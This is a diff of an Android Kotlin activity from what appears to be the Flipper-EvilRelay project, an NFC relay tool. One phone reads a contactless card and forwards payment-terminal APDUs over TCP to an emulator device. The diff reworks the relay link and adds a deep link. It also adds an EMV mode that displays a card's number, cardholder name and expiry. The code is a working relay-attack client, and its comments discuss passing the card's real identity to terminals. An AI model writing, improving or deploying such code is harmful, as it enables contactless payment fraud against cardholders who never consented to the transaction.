@@ -1,5 +1,3 @@
-// SPDX-License-Identifier: GPL-3.0-or-later
-// Copyright (c) 2026 7h30th3r0n3. Part of Flipper-EvilRelay: https://github.com/7h30th3r0n3/Flipper-EvilRelay
 package com.evil.relay
 
 import android.app.AlertDialog
@@ -22,7 +20,6 @@ import androidx.appcompat.widget.SwitchCompat
 import androidx.core.content.ContextCompat
 import com.google.android.material.textfield.TextInputEditText
 import java.net.Inet4Address
-import java.net.InetSocketAddress
 import java.net.NetworkInterface
 import java.net.ServerSocket
 import java.net.Socket
@@ -43,7 +40,7 @@ import kotlin.concurrent.thread
  *
  * HCE limit (Emulator mode only): Android sets its own random UID and does not
  * expose ATS/SAK, so a phone emulator presents Android's identity, not the real
- * card's. RRP-strict terminals reject it; that is why the Flipper is the real
+ * card's. RRP-strict terminals reject it — that is why the Flipper is the real
  * emulator. The Reader (Wi-Fi) path is full ISO-DEP and carries the real ATS.
  */
 class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
@@ -57,21 +54,36 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
     private lateinit var logText: TextView
     private lateinit var roleGroup: RadioGroup
     private lateinit var keepAwake: SwitchCompat
+    private lateinit var subtitle: TextView
+    private lateinit var relayPanel: android.view.View
+    private lateinit var emvPanel: android.view.View
+    private lateinit var wifiBox: android.view.View
+    private lateinit var logLabel: TextView
+    private lateinit var emvScheme: TextView
+    private lateinit var emvPan: TextView
+    private lateinit var emvName: TextView
+    private lateinit var emvExp: TextView
 
     private val port = 5566
     @Volatile private var emulator = false
     @Volatile private var serverRunning = false
     private var server: ServerSocket? = null
 
-    // Reader mode keeps a persistent connection to the bridge so "connected" and
-    // "card scanned" are distinct steps. onTagDiscovered hands cards to this thread.
-    @Volatile private var readerActive = false
-    @Volatile private var pendingIdent: ByteArray? = null
-    @Volatile private var pendingIso: IsoDep? = null
-    private var readerThread: Thread? = null
-
-    private enum class Mode { READER, EMULATOR }
+    private enum class Mode { READER, EMULATOR, EMV_INFO }
     @Volatile private var mode = Mode.READER
+
+    // Log de-dup: onResume() runs checkWifi()/applyRole() on every resume, which used to
+    // reprint the same lines in a loop. Show the "not on WiFi" warning and the role banner
+    // only once (until the underlying state actually changes).
+    private var wifiWarnShown = false
+    private var lastRoleLogged: Mode? = null
+
+    // Reader link: in Reader mode the app holds a persistent TCP connection to the emulator
+    // (opened as soon as the role is active, not per-card) so the emulator sees "app open" before
+    // any card, and a card swap re-uses the same link (new IDENT re-arms the emulator).
+    @Volatile private var readerRunning = false
+    @Volatile private var pendingTag: Tag? = null
+    private var readerThread: Thread? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -84,6 +96,15 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
         logText = findViewById(R.id.logText)
         roleGroup = findViewById(R.id.roleGroup)
         keepAwake = findViewById(R.id.keepAwake)
+        subtitle = findViewById(R.id.subtitle)
+        relayPanel = findViewById(R.id.relayPanel)
+        emvPanel = findViewById(R.id.emvPanel)
+        wifiBox = findViewById(R.id.wifiBox)
+        logLabel = findViewById(R.id.logLabel)
+        emvScheme = findViewById(R.id.emvScheme)
+        emvPan = findViewById(R.id.emvPan)
+        emvName = findViewById(R.id.emvName)
+        emvExp = findViewById(R.id.emvExp)
 
         // Keep the screen awake while relaying (default on): if the phone locks, NFC
         // and the TCP relay get interrupted mid-transaction. Only applies while the
@@ -102,6 +123,7 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
         roleGroup.setOnCheckedChangeListener { _, id ->
             mode = when (id) {
                 R.id.roleEmulator -> Mode.EMULATOR
+                R.id.roleEmvInfo -> Mode.EMV_INFO
                 else -> Mode.READER
             }
             emulator = (mode == Mode.EMULATOR)
@@ -111,6 +133,39 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
         if (nfc == null) {
             setStatus("No NFC on this phone", R.color.err)
         }
+
+        handleDeepLink(intent)
+    }
+
+    override fun onNewIntent(intent: Intent) {
+        super.onNewIntent(intent)
+        setIntent(intent)
+        handleDeepLink(intent)
+    }
+
+    // Deep link entry: evilrelay://relay[?ip=...][&role=reader|emulator]
+    // Opens the app straight into a relay role (default Reader @ 192.168.4.1, i.e. the
+    // Cardputer/ESP32 emulator). Triggered by a QR code or link, not the captive portal
+    // WebView (which Android sandboxes and will not let launch an app).
+    private fun handleDeepLink(intent: Intent?) {
+        val data = intent?.data ?: return
+        if (data.scheme != "evilrelay") return
+        val ip = data.getQueryParameter("ip")?.trim()
+        if (!ip.isNullOrEmpty()) ipInput.setText(ip)
+        val role = (data.getQueryParameter("role") ?: data.host ?: "reader").lowercase()
+        mode = when {
+            role.contains("emul") -> Mode.EMULATOR
+            role.contains("emv")  -> Mode.EMV_INFO
+            else -> Mode.READER
+        }
+        emulator = (mode == Mode.EMULATOR)
+        roleGroup.check(when (mode) {
+            Mode.EMULATOR -> R.id.roleEmulator
+            Mode.EMV_INFO -> R.id.roleEmvInfo
+            else -> R.id.roleReader
+        })
+        applyRole()
+        logln("Deep link: $mode mode" + (if (!ip.isNullOrEmpty()) " -> $ip" else ""))
     }
 
     override fun onResume() {
@@ -123,8 +178,8 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
     override fun onPause() {
         super.onPause()
         nfc?.disableReaderMode(this)
+        stopReaderLink()
         stopServer()
-        stopReaderSession()
     }
 
     private fun applyKeepAwake(on: Boolean) {
@@ -136,114 +191,148 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
     private fun applyRole() {
         nfc?.disableReaderMode(this)
         stopServer()
-        stopReaderSession()
         apduCount(0)
+        updateUiForMode()
         when (mode) {
             Mode.EMULATOR -> {
+                stopReaderLink()   // leaving reader mode -> drop its persistent link
                 startServer()
                 val ip = localIp()
                 setStatus("Emulator - waiting reader", R.color.warn)
                 cardUid.text = "Listen $ip:$port"
-                logln("Emulator (HCE) mode. Reader connects to $ip:$port. Then tap the terminal.")
+                if (lastRoleLogged != Mode.EMULATOR) {
+                    logln("Emulator (HCE) mode. Reader connects to $ip:$port. Then tap the terminal.")
+                    lastRoleLogged = Mode.EMULATOR
+                }
             }
             Mode.READER -> {
                 enableReader()
+                setStatus("Reader - place a card", R.color.warn)
                 cardUid.text = "-"
-                startReaderSession()
+                if (lastRoleLogged != Mode.READER) {
+                    logln("Reader mode (Wi-Fi). Target emulator IP: " + hostIp())
+                    lastRoleLogged = Mode.READER
+                }
+            }
+            Mode.EMV_INFO -> {
+                stopReaderLink()        // read-only, no network
+                enableNfcReader()       // NFC reader only (no TCP link)
+                setStatus("EMV reader - tap a card", R.color.warn)
+                if (lastRoleLogged != Mode.EMV_INFO) {
+                    logln("EMV reader mode (read-only). Tap a card to read its public data.")
+                    lastRoleLogged = Mode.EMV_INFO
+                }
             }
         }
     }
 
-    // Persistent reader session: open (and keep) one connection to the bridge, so
-    // the chain shows as steps - "connecting" -> "connected, hold a card" -> "card
-    // scanned, relaying" - instead of only reacting when a card is tapped. Cards
-    // are handed in by onTagDiscovered via pendingIso/pendingIdent.
-    private fun startReaderSession() {
-        if (readerActive) return
-        readerActive = true
-        pendingIdent = null; pendingIso = null
-        readerThread = thread(name = "reader-relay") {
-            while (readerActive) {
-                if (!checkWifi()) {
-                    setStatus("Join Wi-Fi EvilRelay", R.color.warn)
-                    try { Thread.sleep(1000) } catch (_: InterruptedException) {}
-                    continue
-                }
-                val host = hostIp()
-                var sock: Socket? = null
-                try {
-                    setStatus("Connecting $host:$port", R.color.warn)
-                    val s = Socket()
-                    s.connect(InetSocketAddress(host, port), 3000)
-                    s.tcpNoDelay = true
-                    s.soTimeout = 500 // poll for a new card between frames
-                    sock = s
-                    Relay.readerSocket = s
-                    setStatus("Connected - hold a card", R.color.ok)
-                    logln("Connected to bridge $host:$port - hold a card to scan.")
-                    val out = s.getOutputStream()
-                    val inp = s.getInputStream()
-                    var count = 0
-                    while (readerActive && !s.isClosed) {
-                        val ident = pendingIdent
-                        if (ident != null) {
-                            pendingIdent = null
-                            Relay.sendFrame(out, 1, 0, ident) // IDENT: new card identity
-                            setStatus("Card scanned - relaying", R.color.cyan)
-                        }
-                        val f = try {
-                            Relay.readFrame(inp)
-                        } catch (t: java.net.SocketTimeoutException) {
-                            continue // idle: loop back to check for a new card
-                        } ?: break // socket closed -> reconnect
-                        if (f.type.toInt() and 0xFF == 2) { // REQ (terminal APDU)
-                            val iso = pendingIso
-                            val resp = try {
-                                if (iso != null && iso.isConnected) iso.transceive(f.payload) else null
-                            } catch (e: Exception) {
-                                setStatus("Card lost - hold a card", R.color.warn)
-                                null
-                            }
-                            if (resp != null) {
-                                Relay.sendFrame(out, 3, f.seq.toInt(), resp) // RESP
-                                count++; val c = count
-                                runOnUiThread { apduCount.text = c.toString() }
-                                if (count <= 16) logln("APDU #$count  ${f.payload.size}B -> ${resp.size}B")
-                            }
-                        }
-                    }
-                } catch (e: Exception) {
-                    setStatus("Bridge unreachable - retry", R.color.err)
-                    logln("bridge err: ${e.message}  (WiFi joined? peer IP?)")
-                } finally {
-                    Relay.readerSocket = null
-                    try { sock?.close() } catch (_: Exception) {}
-                }
-                if (readerActive) try { Thread.sleep(800) } catch (_: InterruptedException) {}
-            }
+    // Show/hide the panels and adapt the labels to the current mode (additive; relay UI untouched).
+    private fun updateUiForMode() {
+        val emv = (mode == Mode.EMV_INFO)
+        emvPanel.visibility = if (emv) android.view.View.VISIBLE else android.view.View.GONE
+        relayPanel.visibility = if (emv) android.view.View.GONE else android.view.View.VISIBLE
+        wifiBox.visibility = if (emv) android.view.View.GONE else android.view.View.VISIBLE
+        logLabel.text = if (emv) "EMV DETAILS" else "LOG"
+        subtitle.text = when (mode) {
+            Mode.EMULATOR -> "NFC relay - emulator side"
+            Mode.EMV_INFO -> "EMV reader - read-only"
+            else -> "NFC relay - reader side"
         }
     }
 
-    private fun stopReaderSession() {
-        readerActive = false
-        readerThread?.interrupt()
-        readerThread = null
-        try { Relay.readerSocket?.close() } catch (_: Exception) {}
-        Relay.readerSocket = null
-        pendingIdent = null; pendingIso = null
-    }
-
-    private fun enableReader() {
-        val opts = Bundle().apply { putInt(NfcAdapter.EXTRA_READER_PRESENCE_CHECK_DELAY, 5000) }
+    // Enable the NFC reader (no network). Used by both Reader relay and EMV Info modes.
+    private fun enableNfcReader() {
+        // 1 s presence check: detect card removal / swap quickly so the UID refreshes and a
+        // "card removed" state shows, instead of holding the old tag for 5 s. EMV APDUs flow
+        // sub-second, so this does not cut into an active transaction.
+        val opts = Bundle().apply { putInt(NfcAdapter.EXTRA_READER_PRESENCE_CHECK_DELAY, 1000) }
         nfc?.enableReaderMode(
             this, this,
             NfcAdapter.FLAG_READER_NFC_A or NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK, opts
         )
     }
 
-    // ============================ READER ============================
+    private fun enableReader() {
+        enableNfcReader()
+        startReaderLink()
+    }
+
+    // ============================ READER / EMV ============================
+    // Reader relay: hand the tag to the persistent link thread. EMV Info: read it locally.
     override fun onTagDiscovered(tag: Tag) {
-        if (emulator) return
+        when (mode) {
+            Mode.READER -> pendingTag = tag
+            Mode.EMV_INFO -> readEmv(tag)
+            else -> {}
+        }
+    }
+
+    // Read one card's EMV data locally and display it (read-only, no relay / no network).
+    private fun readEmv(tag: Tag) {
+        val iso = IsoDep.get(tag) ?: run { setStatus("Card not ISO-DEP", R.color.err); return }
+        try {
+            iso.connect()
+            setStatus("Reading EMV...", R.color.cyan)
+            showEmv(Emv.readCard(iso))
+        } catch (e: Exception) {
+            setStatus("Read error", R.color.err); logln("emv err: ${e.message}")
+        } finally { try { iso.close() } catch (_: Exception) {} }
+    }
+
+    private fun showEmv(info: Emv.Info) {
+        runOnUiThread {
+            emvScheme.text = if (info.scheme.isNotEmpty()) info.scheme else "EMV"
+            emvPan.text = if (info.pan.isNotEmpty()) info.pan.chunked(4).joinToString("  ") else "----  ----  ----  ----"
+            emvName.text = if (info.cardholder.isNotEmpty()) info.cardholder else "-"
+            emvExp.text = if (info.expiry.isNotEmpty()) info.expiry else "--/--"
+            logText.text = ""
+        }
+        logln(Emv.format(info))
+        setStatus(if (info.ok) "EMV read OK" else "No EMV data", if (info.ok) R.color.ok else R.color.warn)
+    }
+
+    private fun startReaderLink() {
+        if (readerRunning) return
+        readerRunning = true
+        readerThread = thread(name = "reader-link") {
+            while (readerRunning) {
+                val host = hostIp()
+                try {
+                    Socket(host, port).use { sock ->
+                        sock.tcpNoDelay = true
+                        sock.soTimeout = 700   // wake when idle so card removal is noticed
+                        setStatus("Linked to $host - tap a card", R.color.ok)
+                        logln("Linked to emulator $host - tap a card")
+                        runOnUiThread { cardUid.text = "-" }
+                        while (readerRunning && !sock.isClosed) {
+                            val tag = pendingTag
+                            if (tag == null) { try { Thread.sleep(50) } catch (_: Exception) {}; continue }
+                            pendingTag = null
+                            serveCard(tag, sock)   // IDENT + relay until the card is removed (throws if link dies)
+                            if (readerRunning && !sock.isClosed) {
+                                setStatus("Linked - tap a card", R.color.ok)
+                                runOnUiThread { cardUid.text = "-" }
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    setStatus("No emulator at ${hostIp()} - retry", R.color.warn)
+                    logln("link err: ${e.message}  (WiFi joined? peer IP?)")
+                }
+                if (readerRunning) try { Thread.sleep(800) } catch (_: Exception) {}   // reconnect backoff
+            }
+        }
+    }
+
+    private fun stopReaderLink() {
+        readerRunning = false
+        pendingTag = null
+        readerThread = null   // thread exits on readerRunning=false; use{} closes the socket
+    }
+
+    // Relay one card over the already-open link. Returns when the card is removed (keep the socket,
+    // wait for the next card). Throws on a dead socket so the link thread reconnects.
+    private fun serveCard(tag: Tag, sock: Socket) {
         val iso = IsoDep.get(tag) ?: run { setStatus("Card not ISO-DEP", R.color.err); return }
         val nfca = NfcA.get(tag)
         try {
@@ -254,24 +343,37 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
             val sak = (nfca?.sak?.toInt() ?: 0x20)
             val hist = iso.historicalBytes ?: ByteArray(0)
             val ats = buildAts(hist)
-            // Build the IDENT and hand the live card to the persistent reader session
-            // (it owns the bridge socket and transceives on this IsoDep).
+            runOnUiThread { cardUid.text = "UID ${Relay.hex(uid)}  SAK %02X".format(sak) }
+            val out = sock.getOutputStream(); val inp = sock.getInputStream()
             val ident = ArrayList<Byte>()
             ident.add(uid.size.toByte()); uid.forEach { ident.add(it) }
             ident.add(atqa.getOrElse(0) { 0 }); ident.add(atqa.getOrElse(1) { 0 })
             ident.add(sak.toByte())
             ident.add(ats.size.toByte()); ats.forEach { ident.add(it) }
-            pendingIso = iso
-            pendingIdent = ident.toByteArray()
-            runOnUiThread { cardUid.text = "UID ${Relay.hex(uid)}  SAK %02X".format(sak) }
-            setStatus("Card scanned - relaying", R.color.cyan)
-            logln("Card ${Relay.hex(uid)} scanned - relaying.")
-        } catch (e: Exception) {
-            setStatus("Card read error", R.color.err)
-            logln("card err: ${e.message}")
+            Relay.sendFrame(out, 1, 0, ident.toByteArray())   // new identity -> emulator re-arms
+            setStatus("Relay active", R.color.ok)
+            logln("Card UID ${Relay.hex(uid)} - relay active")
+            var count = 0
+            // Blocking read = zero added latency during a transaction; on idle timeout re-check the
+            // card and break if it was removed (iso.isConnected flips ~1s after the presence check).
+            while (readerRunning && iso.isConnected && !sock.isClosed) {
+                val f = try { Relay.readFrame(inp) }
+                        catch (te: java.net.SocketTimeoutException) { if (!iso.isConnected) break else continue }
+                        ?: throw java.io.IOException("emulator closed")   // socket dead -> reconnect
+                if (f.type.toInt() and 0xFF == 2) {
+                    val resp = try { iso.transceive(f.payload) }
+                    catch (e: Exception) { setStatus("Card lost - re-tap", R.color.err); logln("Card lost mid-APDU"); break }
+                    Relay.sendFrame(out, 3, f.seq.toInt(), resp)
+                    count++; val c = count
+                    runOnUiThread { apduCount.text = c.toString() }
+                    if (count <= 16) logln("APDU #$count  ${f.payload.size}B -> ${resp.size}B")
+                }
+            }
+            logln("Card session ended ($count APDU)")
+            if (count > 0) setStatus("Card done - $count APDU", R.color.cyan)
+        } finally {
+            try { iso.close() } catch (_: Exception) {}
         }
-        // The IsoDep stays open for the session to transceive; Android invalidates it
-        // when the tag leaves, and a new tap replaces it via pendingIso.
     }
 
     // ============================ EMULATOR ============================
@@ -330,7 +432,9 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
         val net = cm.activeNetwork
         val cap = cm.getNetworkCapabilities(net)
         val wifi = cap?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
-        if (!wifi) logln("Warning: not on WiFi. Join the relay WiFi / hotspot.")
+        if (!wifi && mode != Mode.EMV_INFO) {
+            if (!wifiWarnShown) { logln("Warning: not on WiFi. Join the relay WiFi / hotspot."); wifiWarnShown = true }
+        } else wifiWarnShown = false   // back on WiFi (or EMV mode) -> allow one fresh warning later
         return wifi
     }
 
